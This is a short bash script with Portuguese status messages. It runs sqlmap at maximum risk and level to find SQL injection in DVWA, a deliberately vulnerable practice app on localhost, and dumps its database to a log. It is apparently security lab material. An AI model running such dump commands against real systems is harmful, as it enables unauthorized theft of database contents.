#!/bin/bash
echo "[*] Executando ataque SQL Injection com SQLMap..."
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --data="id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=123" \
  --batch --risk=3 --level=5 --dump \
  -o -v 1 | tee sqlmap-dvwa.log
echo "[✓] Ataque finalizado."
